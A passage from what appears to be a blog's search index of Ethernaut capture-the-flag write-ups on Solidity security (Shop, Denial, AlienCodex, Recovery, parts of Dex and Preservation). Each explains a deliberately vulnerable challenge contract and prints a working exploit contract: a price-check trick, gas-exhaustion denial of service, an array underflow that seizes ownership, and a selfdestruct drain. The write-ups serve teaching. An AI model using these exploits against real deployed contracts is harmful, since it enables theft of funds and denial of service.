smart contracts introduces a significant attack vector. An attacker with substantial capital can manipulate the price, leading to incorrect data being used by dependent applications.\nDecentralization vs. Centralization: While the exchange itself may be decentralized, the asset\u0026rsquo;s price can still be centralized if it comes from a single DEX. This centralization makes it susceptible to manipulation.\nMitigation through Multiple Sources: Using tokens that represent real assets, which have exchange pairs across multiple DEXes and networks, can mitigate the risk. This diversification reduces the impact of any single DEX targeted by an attack.\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/dex/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Decentralized Exchange","url":"/tags/decentralized-exchange/"}],"timestamp":1729626397,"title":"Dex"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Shop Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Can you get the item from the shop for less than the price asked?\nThings that might help:\nShop expects to be used from a Buyer Understanding restrictions of view functions Contract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4interface Buyer { 5 function price() external view returns (uint256); 6} 7 8contract Shop { 9 uint256 public price = 100; 10 bool public isSold; 11 12 function buy() public { 13 Buyer _buyer = Buyer(msg.sender); 14 15 if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) { 16 isSold = true; 17 price = _buyer.price(); 18 } 19 } 20} The contract has two state variables named price and isSold. price is of type uint256 and it is initialized to 100, while isSold is of type bool.\n1function buy() public { 2 Buyer _buyer = Buyer(msg.sender); 3 4 if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) { 5 isSold = true; 6 price = _buyer.price(); 7 } 8} The function buy() initializes the variable _buyer of type Buyer interface with msg.sender. It then checks if the price offered by the buyer is greater than or equal to the current price and if the item has not been sold yet. If both conditions are met, the item is marked as sold and the price is updated to the buyer\u0026rsquo;s price.\nExploit 1function buy() public { 2 Buyer _buyer = Buyer(msg.sender); 3 4 if (_buyer.price() \u0026gt;= price \u0026amp;\u0026amp; !isSold) { 5 isSold = true; 6 price = _buyer.price(); 7 } 8} If we see the buy() function, in the if condition, it will check if the buyer\u0026rsquo;s price is more than the current price or not. But the buyer\u0026rsquo;s price is taken by making a call to the buyer. Once the conditions are satisfied, then it sets isSold to true and it sets the price by again making a call to the buyer.\nSo in our exploit contract, if we somehow return the price value \u0026gt;100 for the first time it is called and if we return a value less than \u0026lt;100 for the second time it is called, then our challenge will be solved.\nBut if we check the Buyer interface, we can find that price() is a view-only function, which means we cannot make any state changes in the price() function.\nOnce the if condition in buy() is satisfied, then isSold is set to true and then the price value is fetched from the buyer. Since price() function is a view function, we can check if isSold is true or false before returning the price. Based on that, we can write the exploit contract. Below is the exploit contract.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5interface Ishop{ 6 function isSold() external view returns (bool); 7 function buy()external; 8} 9 10contract ExploitShop{ 11 Ishop shop; 12 constructor(address _addr){ 13 shop=Ishop(_addr); 14 } 15 16 function Exploit()public{ 17 shop.buy(); 18 } 19 20 function price() external view returns(uint256){ 21 if(shop.isSold()){ 22 return 0; 23 } 24 return 101; 25 } 26} If we see the price() function in our exploit contract, first it will check if the item is sold or not. If the item is sold, it will return 0, otherwise it will return 101.\nOnce we call the Exploit() function, our challenge will be solved.\nKey Takeaways We should be careful when the logic in our contract is dependent on other contract calls. In this case, if the price() function is a pure function instead of a view function, then the function won\u0026rsquo;t be able to read state variables from other contracts.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/shop/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Control Flow Manipulation","url":"/tags/control-flow-manipulation/"}],"timestamp":1729626354,"title":"Shop"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Denial Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.\nIf you can deny the owner from withdrawing funds when they call withdraw() (while the contract still has funds, and the transaction is of 1M gas or less), you will win this level.\nContract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract Denial { 6 address public partner; // withdrawal partner - pay the gas, split the withdraw 7 address public constant owner = address(0xA9E); 8 uint256 timeLastWithdrawn; 9 mapping(address =\u0026gt; uint256) withdrawPartnerBalances; // keep track of partners balances 10 11 function setWithdrawPartner(address _partner) public { 12 partner = _partner; 13 } 14 15 // withdraw 1% to recipient and 1% to owner 16 function withdraw() public { 17 uint256 amountToSend = address(this).balance / 100; 18 // perform a call without checking return 19 // The recipient can revert, the owner will still get their share 20 partner.call{value: amountToSend}(\u0026#34;\u0026#34;); 21 payable(owner).transfer(amountToSend); 22 // keep track of last withdrawal time 23 timeLastWithdrawn = block.timestamp; 24 withdrawPartnerBalances[partner] += amountToSend; 25 } 26 27 // allow deposit of funds 28 receive() external payable {} 29 30 // convenience function 31 function contractBalance() public view returns (uint256) { 32 return address(this).balance; 33 } 34} I hope you are good at understanding contracts. If you are unable to understand the contract, then stop here and try out all the challenges on your own without going through any write-up. If there are any new things in the contract, I will explain those types of contracts.\nKey Concepts To Learn In Solidity, we use assert and require to check certain conditions are met or not. But we need to understand the major difference between assert and require.\nassert: This is used to check for conditions that should never occur in a correctly functioning contract. If an assert fails, it indicates a serious issue in the code, such as an internal error or a bug. It is typically used to validate invariants or to check for conditions that should always be true. Below is an example of assert.\nrequire: This is used for input validation and to ensure certain conditions are met before executing further code. It can check for things like valid user inputs, sufficient funds, or conditions related to external calls. If a require statement fails, it reverts the transaction and provides an error message.\nBelow is an example that gives much clarity about the usage difference between assert and require.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract ExampleContract { 5 uint256 public value; 6 7 // Function to set the value with input validation 8 function setValue(uint256 _value) public { 9 // Use require to validate input 10 require(_value \u0026gt; 0, \u0026#34;Value must be greater than 0\u0026#34;); 11 value = _value; 12 } 13 14 // Function to increment the value 15 function incrementValue() public { 16 // Use assert to check internal logic 17 uint256 oldValue = value; 18 value += 1; 19 20 // Ensure that value has increased correctly 21 assert(value == oldValue + 1); 22 } 23} The major difference between assert() and require() is that if the condition in require() fails, it will revert all the changes made and also refund the gas offered for the transaction. But if the assert() fails, it will consume all the gas and revert all the state changes.\nExploit Now our task is to make the contract deny the transactions that call the withdraw() function.\n1function withdraw() public { 2 uint256 amountToSend = address(this).balance / 100; 3 // perform a call without checking return 4 // The recipient can revert, but the owner will still get their share 5 partner.call{value: amountToSend}(\u0026#34;\u0026#34;); 6 payable(owner).transfer(amountToSend); 7 // keep track of last withdrawal time 8 timeLastWithdrawn = block.timestamp; 9 withdrawPartnerBalances[partner] += amountToSend; 10 } If we see the withdraw() function, we can observe that whenever someone calls the withdraw() function, it will send contract balance/100 to the partner as well as the owner. If we set our address as the partner, we will become the partner and it will send the ether.\n1function setWithdrawPartner(address _partner) public { 2 partner = _partner; 3} By calling the above function, we can set the partner to whatever address we pass during the function call.\nIf we set the partner address as EOA (Externally owned account), it won\u0026rsquo;t be useful because we can\u0026rsquo;t reject some one sending ether to our account. We need to write an Exploit contract, and we need to set the Exploit contract as the partner.\nIn general if we want call withdraw() function we need to send some units of gas such that it will be sufficient to execute all the lines in withdraw(). If we send only limited gas the function call will revert.\nSince the withdraw() function is making a low-level call during the call, it will send the entire gas (gas required for executing low-level call as well as gas required to execute the next lines after low-level call) during the call. Once the partner transaction is completed, the remaining gas is returned to the withdraw() function, and the remaining gas is used to execute the next lines.\nSince the withdraw() function is making a low-level call to the partner (exploit contract), in our exploit contract, if we somehow consume all the gas, then there won\u0026rsquo;t be enough gas to execute the transfer() function, and it will revert the entire function call of withdraw().\nWhen a contract makes a low-level call to another contract, there should be a receive() function in the called contract. In the receive() function, we can write whatever code we want. So if we write an assert() condition that will always fail, then the assert() will consume all the gas and revert. The below is the exploit contract.\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.7.0; 3 4 5contract ExploitDenial{ 6 7 receive() external payable { 8 assert(false); 9 } 10} Deploy this contract and open the console and enter the following\nWhat happens if you use revert() instead of assert() ? Will it revert all the state changes or reverts only the low-level call function? It will revert only call() function because call is designed in such a way that when it is used if the call is successful it will return true if the call fails it returns false. So if we just use revert() it will only revert the call function but the lines after revert will execute normal way unless return value is handled properly.\n1\u0026gt; await contract.setWithdrawPartner(\u0026#34;YOUR__EXPLOIT__CONTRACT__ADDRESS\u0026#34;) Once the transaction is completed, just submit the instance.\nKey Takeaways The Denial contract is currently using a low-level call to send ether. However, if it were to use the transfer() or send() function instead, the exploit described above would not be possible. This is because a low-level call sends the entire gas during the call, whereas send() and transfer() only send 2300 units of gas, which is sufficient for the transfer of ether.\nIf the contract were to use transfer(), the function would only send 2300 units of gas, which is enough for transferring ether. After the transfer, there wouldn\u0026rsquo;t be much room for additional operations. If we were to attempt any operations in the receive() function of our contract, the transfer() would be reverted. Although the revert would only return false, it wouldn\u0026rsquo;t have any effect on the main function call.\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/denial/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Denial of Service","url":"/tags/denial-of-service/"}],"timestamp":1729626307,"title":"Denial"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Alien Codex Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description Hello hacker, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here.\nYou\u0026rsquo;ve uncovered an Alien contract. Claim ownership to complete the level.\nThings that might help:\nUnderstanding how array storage works Understanding ABI specifications Using a very underhanded approach Contract Explanation The contract AlienCodex inherits a contract named Ownable with a version of 0.5.0. The AlienCodex contract has two state variables: contact, which is a boolean, and codex, which is a dynamic array of type bytes32.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.5.0; 3 4import \u0026#34;../helpers/Ownable-05.sol\u0026#34;; 5 6contract AlienCodex is Ownable { 7 bool public contact; 8 bytes32[] public codex; 9 10 modifier contacted() { 11 assert(contact); 12 _; 13 } 14 15 function makeContact() public { 16 contact = true; 17 } 18 19 function record(bytes32 _content) public contacted { 20 codex.push(_content); 21 } 22 23 function retract() public contacted { 24 codex.length--; 25 } 26 27 function revise(uint256 i, bytes32 _content) public contacted { 28 codex[i] = _content; 29 } 30} The contract AlienCodex inherits a contract named Ownable. The version of the Ownable contract is 0.5.0. Click here to view the ownable contract.\nThe contract AlienCodex has two state variables: contact, which is a boolean, and codex, which is an array of type bytes32.\n1modifier contacted() { 2 assert(contact); 3 _; 4} This modifier checks whether contact returns true or not. If contact returns true, the modifier will be passed; otherwise, it will revert.\n1function makeContact() public { 2 contact = true; 3} The function makeContact() is a public function that sets contact to true.\n1function record(bytes32 _content) public contacted { 2 codex.push(_content); 3} The function record() is a public function that takes an argument of type bytes32 as input. It adds the _content to the codex array.\n1function retract() public contacted { 2 codex.length--; 3} The function retract() is a public function. It first executes the contacted modifier. If the modifier passes successfully, it will decrement the array length, effectively removing the last element from the array.\n1function revise(uint256 i, bytes32 _content) public contacted { 2 codex[i] = _content; 3} The function revise() is a public function that takes arguments of type uint256 (i) and bytes32 (_content) as input. The function updates the value at index i in the codex array with the _content. If the array size is less than the index passed, it will revert.\nKey Concepts To Learn I have already discussed how array storage works in the Privacy challenge. I have explained about storage slots of static and dynamic arrays along with examples.\nRefer to that challenge to learn how storage slots work.\nExploit Now let\u0026rsquo;s try to crack this challenge.\nOur task is to become the owner of this contract. The logic for managing ownership is in the Ownable contract. But we can\u0026rsquo;t find any exploit there. However, if we see the compiler version of the AlienCodex contract, it is 0.5.0. We know that every contract whose compiler version is less than 0.8.0 and does not have the SafeMath library is vulnerable to overflow and underflow exploits.\nNow let\u0026rsquo;s understand the storage layout of the contract.\nSince the AlienCodex contract is inheriting the Ownable contract, the storage layout starts with the Ownable contract\u0026rsquo;s state variables. When we open the Ownable contract, we can observe that there is only one state variable, which is the address of the owner.\nSo the owner will be in slot0.\nIf we check the AlienCodex contract, there are two state variables. One is a boolean named contact, and the other one is a dynamic array named codex.\nSince the variable owner size is only 20 bytes, there are 12 bytes left to be filled in slot0. If the next state variable size is less than 12 bytes, then the next variable will also be stored in the same slot0.\nSince a bool is only one byte, contact will be stored in slot0 itself.\nThe next state variable in AlienCodex is a dynamic array, so it will start in the next slot. Since it is a dynamic array, the length of the array will be stored in slot1, and the first element of the array will be stored at keccak(abi.encode(1)). The second element will be stored at keccak(abi.encode(1)) + 1, and so on.\n1function retract() public contacted { 2 codex.length--; 3} If we look at the retract() function, we can see that it is decrementing the size of the codex array by removing the last element.\nBut what if the array size is zero and then we call retract()? Then it will reduce the size by 1, which leads to underflow. If we call retract() when the array size is zero, it leads to underflow, and the array size becomes 2**256-1.\nIn Solidity, every state variable is stored in the EVM in the form of storage slots. There are a total of 2**256-1 storage slots for a contract. Now, if we compare the latest array size (2**256-1) and the number of storage slots, we can conclude that both are of the same size, which means the array is occupying the entire storage layout of that contract.\nEven if there are other variables other than the codex array, they will also be stored in one of the 2**256-1 slots. That means if there is a state variable stored in the storage layout of the contract and if we change all the elements of the new array, which is of size 2**256-1, then the state variable is overwritten. This is a huge vulnerability.\nOur task is to claim ownership. So we need to overwrite the owner variable, which is stored at slot0.\nNow, when we call retract(), the array size will become 2**256-1, and the first element of the array will be stored at keccak256(abi.encode(1)). Since the owner is in slot0, we need to overwrite slot0. Technically, slot zero is (2**256-1)+1, where 2**256-1 is the last storage slot of the contract, and when we add 1 to the max size of the array, it will lead to an overflow.\nThe first element of the array is stored at keccak256(abi.encode(1)). The second element will be stored at keccak256(abi.encode(1)) + 1, and so on. If we know the index of the last storage slot, then we can easily change the value at the zeroth storage slot by causing an overflow.\nNow we need to create an equation such that keccak256(abi.encode(1))+x=(2**256-1). This means that when we add some x to the storage slot of the first element of the array, the sum should become 2**256-1, which is the last slot of a contract.\nFrom the above equation, we can write x=(2**256-1)-keccak256(abi.encode(1)).\nx will be the index at which the last slot value is stored. If we add 1 to it, it will lead to an overflow, and it will be the place where the value of the zeroth slot will be stored. Now we can assign the value whatever we want there.\nSo now our target index is x=(2**256-1)-keccak256(abi.encode(1))+1.\nBelow is the exploit contract:\n1// SPDX-License-Identifier: MIT 2pragma solidity ^0.5.0; 3 4import {AlienCodex} from \u0026#34;./AlienCodex.sol\u0026#34;; 5 6contract ExploitAlienCodex { 7 AlienCodex alienCodex; 8 9 constructor(address _addr) public { 10 alienCodex = AlienCodex(_addr); 11 } 12 13 function Exploit() public { 14 alienCodex.makeContact(); 15 alienCodex.retract(); 16 uint256 index = (2**256-1)-uint256(keccak256(abi.encode(1)))+1; 17 alienCodex.revise(index, bytes32(uint256(uint160(msg.sender)))); 18 } 19 20} Once you call the exploit function, the challenge will be solved.\nKey Takeaways The retract() function can be exploited to underflow the codex array and overwrite the storage layout of the contract. By calculating the index of the last storage slot and causing an overflow, we can overwrite the value of the owner variable and claim ownership of the contract. We should we careful while using the solidity compiler version\u0026rsquo;s less than 0.8.0. ","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/aliencodex/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Storage Layout","url":"/tags/storage-layout/"},{"title":"Overflow","url":"/tags/overflow/"},{"title":"Underflow","url":"/tags/underflow/"}],"timestamp":1729626267,"title":"AlienCodex"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Recovery Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description In this challenge, a contract creator has built a simple token factory contract. Creating new tokens is a breeze. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. Unfortunately, they have lost the contract address.\nTo complete this level, your task is to recover (or remove) the 0.001 ether from the lost contract address.\nContract Explanation Before diving into the exploit part, it\u0026rsquo;s essential to understand the contract. If you\u0026rsquo;re new to Solidity, reading the Contract Explanation will provide you with a better grasp of the language.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Recovery { 5 //generate tokens 6 function generateToken(string memory _name, uint256 _initialSupply) public { 7 new SimpleToken(_name, msg.sender, _initialSupply); 8 } 9} 10 11contract SimpleToken { 12 string public name; 13 mapping(address =\u0026gt; uint256) public balances; 14 15 // constructor 16 constructor(string memory _name, address _creator, uint256 _initialSupply) { 17 name = _name; 18 balances[_creator] = _initialSupply; 19 } 20 21 // collect ether in return for tokens 22 receive() external payable { 23 balances[msg.sender] = msg.value * 10; 24 } 25 26 // allow transfers of tokens 27 function transfer(address _to, uint256 _amount) public { 28 require(balances[msg.sender] \u0026gt;= _amount); 29 balances[msg.sender] -= _amount; 30 balances[_to] += _amount; 31 } 32 33 // clean up after ourselves 34 function destroy(address payable _to) public { 35 selfdestruct(_to); 36 } 37} This challenge consists of two contracts: Recovery and SimpleToken. Let\u0026rsquo;s start with the Recovery contract. It has a single function:\n1function generateToken(string memory _name, uint256 _initialSupply) public { 2 new SimpleToken(_name, msg.sender, _initialSupply); 3} This function creates a new instance of the SimpleToken contract by taking two arguments: a string _name and a uint256 _initialSupply.\nNow, let\u0026rsquo;s move on to the SimpleToken contract.\nThe SimpleToken contract has two state variables: name (a string) and balances (a mapping of addresses to uint256).\nThe constructor of SimpleToken takes three arguments: _name (a string), _creator (an address), and _initialSupply (a uint256). It sets the name state variable to the provided _name and assigns the _initialSupply to the balances mapping for the _creator address.\n1receive() external payable { 2 balances[msg.sender] = msg.value * 10; 3} The receive() function is a built-in function in Solidity. It is invoked when someone interacts with the contract without calling any specific function or with data that doesn\u0026rsquo;t match any function selector. In this case, when someone sends ether to the contract without calling any function, the receive() function is triggered. It sets the balance of the msg.sender (the caller) to the value of the sent ether multiplied by 10.\n1function transfer(address _to, uint256 _amount) public { 2 require(balances[msg.sender] \u0026gt;= _amount); 3 balances[msg.sender] -= _amount; 4 balances[_to] += _amount; 5} The transfer() function allows the transfer of tokens. It takes two arguments: _to (the address to transfer the tokens to) and _amount (the amount of tokens to transfer). Before executing the transfer, it checks if the caller has a sufficient balance. If the balance is enough, it deducts the _amount from the caller\u0026rsquo;s balance and adds it to the _to address.\n1function destroy(address payable _to) public { 2 selfdestruct(_to); 3} The destroy() function takes an address _to as an argument and calls the selfdestruct() function with _to as the argument. To understand how selfdestruct() works, refer to the concepts section.\nKey Concepts To Learn The main concept to focus on in this challenge is the usage of selfdestruct(). Additionally, you can explore RLP encoding if you\u0026rsquo;re interested.\nselfdestruct() is a built-in function in Solidity. When called, it is supposed to delete the contract bytecode from the Ethereum network and send the contract\u0026rsquo;s balance to the specified address.\nHowever, due to the implementation of EIP-6780 in the Dencun upgrade on March 13, 2024, the behavior of selfdestruct has changed. It now only sends the contract\u0026rsquo;s ether balance to the specified address but does not delete the contract bytecode from the Ethereum network.\nDeleting the contract bytecode is still possible after the update, but only if selfdestruct is called in the same transaction in which the contract is created.\nThe address of an Ethereum contract is determined by the creator\u0026rsquo;s address (sender) and the number of transactions the creator has sent (nonce). The sender and nonce are RLP-encoded and then hashed with Keccak-256.\n1import rlp #python -m pip install rlp 2from sha3 import keccak_256 3 4def get_Contract_Address(sender,nonce): 5 contract_address = keccak_256(rlp.encode([sender, nonce])).hexdigest()[-40:] 6 return contract_address 7 8 9sender_address=input(\u0026#34;Enter the sender (contract creator) address :\u0026#34;) 10nonce=int(input(\u0026#34;Enter the Nonce :\u0026#34;)) 11sender=sender_address[2:] 12sender=bytes.fromhex(sender) 13print(get_Contract_Address(sender,nonce)) Enter the following in the terminal to download rlp module.\n1$ python -m pip install rlp Enter the address of the Externally Owned Account and enter the nonce of the externally owned account. Whenever you deploy a contract using your wallet or interact with a function that makes state changes for every transaction, the nonce will be increased. You can find your nonce in your wallet or Block Explorer.\nExploit Enter ctrl + shift + j and open the console, then enter the following:\n1\u0026gt; contract.abi When we enter this, we can find that our instance has only one function named generateToken(). By this, we can say that they have given us the instance of the Recovery contract.\nNow our task is to find the address of the SimpleToken contract and call the destroy() function. We can find the address of SimpleToken in two ways. One way is using the block explorer, and another way is calculating the address of SimpleToken with the help of the Recovery contract address and the nonce of the Recovery contract address. First, I will explain how you can find the address using the block explorer.\nClick here to open the block explorer. When you click the link, you can find it as shown in the image below:\nIn the search bar, search for the address of the Recovery (instance) contract. When you search, you will find it as shown below:\nYou can\u0026rsquo;t find any transactions because no one has invoked any function in this contract. Now click on internal transactions. Once you click, you will find it as shown below:\nNow you can find two contract creations. The one at the bottom is the contract creation of this contract, and the one at the top is this contract creating another contract. This (Recovery) contract created the SimpleToken contract. So the top one is the address of the SimpleToken contract. Click on the contract creation of the top one. Once you click, you will find it as shown below:\nThis is the address of the SimpleToken contract. SimpleToken contract has a balance of 0.01 ether. Since we got the address of the SimpleToken, we can call the destroy() function now.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5interface Itoken{ 6 function destroy(address paayble) external; 7} 8 9contract ExploitSimpleToken{ 10 11 Itoken simpleToken; 12 constructor(address _addr){ 13 simpleToken=Itoken(_addr); 14 } 15 16 function Exploit()public{ 17 simpleToken.destroy(msg.sender); 18 } 19 20} Deploy this contract, and during deployment, pass the address of SimpleToken to the constructor of the ExploitSimpleToken contract. Then call the Exploit() function. Once the transaction is complete, the challenge will be solved.\nKey Takeaways The Ethereum contract address is generated in a deterministic manner using the creator\u0026rsquo;s address (sender) and the number of transactions they have sent (nonce). To compute the address, the sender and nonce are encoded using RLP (Recursive Length Prefix) and then hashed with the Keccak-256 algorithm.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/recovery/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Address Recovery","url":"/tags/address-recovery/"}],"timestamp":1729626188,"title":"Recovery"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Preservation Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you\u0026rsquo;re new to Solidity and haven\u0026rsquo;t deployed a smart contract before, you can learn how to do so using Remix here. Challenge Description This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.\nThe goal of this level is for you to claim ownership of the instance you are given.\nThings that might help\nLook into Solidity\u0026rsquo;s documentation on the delegatecall low-level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope. Understand what it means for delegatecall to be context-preserving. Understand how storage variables are stored and accessed. Understand how casting works between different data types. Contract Explanation If you understand the contract, you can move on to the exploit part. If you\u0026rsquo;re a beginner, please read the Contract Explanation to gain a better understanding of Solidity.\nClick to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Preservation { 5 // public library contracts 6 address public timeZone1Library; 7 address public timeZone2Library; 8 address public owner; 9 uint256 storedTime; 10 // Sets the function signature for delegatecall 11 bytes4 constant setTimeSignature = bytes4(keccak256(\u0026#34;setTime(uint256)\u0026#34;)); 12 13 constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) { 14 timeZone1Library = _timeZone1LibraryAddress; 15 timeZone2Library = _timeZone2LibraryAddress; 16 owner = msg.sender; 17 } 18 19 // set the time for timezone 1 20 function setFirstTime(uint256 _timeStamp) public { 21 timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); 22 } 23 24 // set the time for timezone 2 25 function setSecondTime(uint256 _timeStamp) public { 26 timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); 27 } 28} 29 30// Simple library contract to set the time 31contract LibraryContract { 32 // stores a timestamp 33 uint256 storedTime; 34 35 function setTime(uint256 _time) public { 36 storedTime = _time; 37 } 38} There are two contracts in the challenge: Preservation and LibraryContract. First, I will explain LibraryContract.\nLibraryContract has a state variable named storedTime of type uint256. The value of storedTime will be updated in the setTime() function.\n1function setTime(uint256 _time) public { 2 storedTime = _time; 3} The above function named setTime() takes a uint256 argument as input. Whenever the function is called, it will change the value of storedTime.\nThe contract Preservation has the following state variables: timeZone1Library of type address, timeZone2Library of type address, owner of type address, storedTime of type uint256, and setTimeSignature of type bytes4.\nsetTimeSignature is initialized with the function selector of the setTime() function.\n1constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) { 2 timeZone1Library = _timeZone1LibraryAddress; 3 timeZone2Library = _timeZone2LibraryAddress; 4 owner = msg.sender; 5} The constructor takes two arguments of type address as input and sets the timeZone1Library and timeZone2Library with the addresses passed as inputs. It also sets the owner to msg.sender (the contract deployer). timeZone1Library and timeZone2Library are instances of LibraryContract.\n1function setFirstTime(uint256 _timeStamp) public { 2 timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); 3} The function setFirstTime() takes a uint256 as an argument and makes a delegate call to timeZone1Library with the data as the function selector of the setTime() function and the timestamp passed to setFirstTime().\n1function setSecondTime(uint256 _timeStamp) public { 2 timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp)); 3} The function setSecondTime() takes a uint256 as an argument and makes a delegate call to timeZone1Library with the data as the function selector of the setTime() function and the timestamp passed to setSecondTime().\nBoth of the above functions will make a delegate call to LibraryContract by calling the setTime() function.\nKey Concepts To Learn To exploit this challenge, we need to dive deep into how a delegate call works.\nI hope you have solved the Delegation challenge. If not, click here to solve the challenge. There, I have explained the difference between call, delegatecall, and staticcall.\nCheck the below example.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract contract_one{ 6 bool public locked; 7 uint256 public Number; 8 9 function unlock()public{ 10 locked=false; 11 } 12 13 function changeNumber(uint256 _num)public{ 14 Number=_num; 15 } 16} 17 18contract contract_two{ 19 bool public locked=true; 20 uint256 public Number=78; 21 contract_one contract_One; 22 constructor(address _addr){ 23 contract_One =contract_one(_addr); 24 } 25 26 function Change_Number(uint256 _num)public{ 27 (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature(\u0026#34;changeNumber(uint256)\u0026#34;,_num)); 28 require(success,\u0026#34;Call failed\u0026#34;); 29 } 30 31 function Unlock()public{ 32 (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature(\u0026#34;unlock()\u0026#34;)); 33 require(success,\u0026#34;Call failed\u0026#34;); 34 } 35 36} Try out this example in Remix. It will help you understand delegate calls better. If you have no idea about delegate calls, check my write-up for the Delegation challenge.\nThe Change_Number() function in contract_two makes a delegate call to contract_one, calling the changeNumber() function in contract_one. The changeNumber() function in contract_one will set the variable Number to the argument passed during the call. However, since it is a delegate call, the variable Number won\u0026rsquo;t be changed in contract_one; it will be changed in contract_two.\nOkay, we can understand that when we make a delegate call from one contract to another contract, the state changes will be done in the calling contract and the logic execution will be done in the called contract.\nIn our example, it is changing the Number, but how does it work? How can contract_one know where the state variable Number is located?\nSimply put, it works based on storage layout. Two contracts should have the same storage layout. If we check our example, contract_one has state variables bool and uint256, and contract_two has state variables bool, uint256, and contract_one. So when contract_two makes a delegate call to contract_one and the function changes Number, it will update the uint256 variable. Since contract_two also has a uint256 at the same position, it will be updated in contract_two.\n1 2// SPDX-License-Identifier: MIT 3pragma solidity ^0.8.0; 4 5contract contract_one{ 6 bool public locked; 7 uint256 public Number; 8 9 function unlock()public{ 10 locked=false; 11 } 12 13 function changeNumber(uint256 _num)public{ 14 Number=_num; 15 } 16} 17 18contract contract_two{ 19 contract_one public contract_One; 20 bool public locked=true; 21 uint256 public Number=78; 22 constructor(address _addr){ 23 contract_One =contract_one(_addr); 24 } 25 26 function Change_Number(uint256 _num)public{ 27 (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature(\u0026#34;changeNumber(uint256)\u0026#34;,_num)); 28 require(success,\u0026#34;Call failed\u0026#34;); 29 } 30 31 function Unlock()public{ 32 (bool success, bytes memory data) = address(contract_One).delegatecall(abi.encodeWithSignature(\u0026#34;unlock()\u0026#34;)); 33 require(success,\u0026#34;Call failed\u0026#34;); 34 } 35 36} In our contract_two, instead of using contract_one as the third state variable, if we use it as the first variable, when we delegate call to the unlock() function in contract_one, 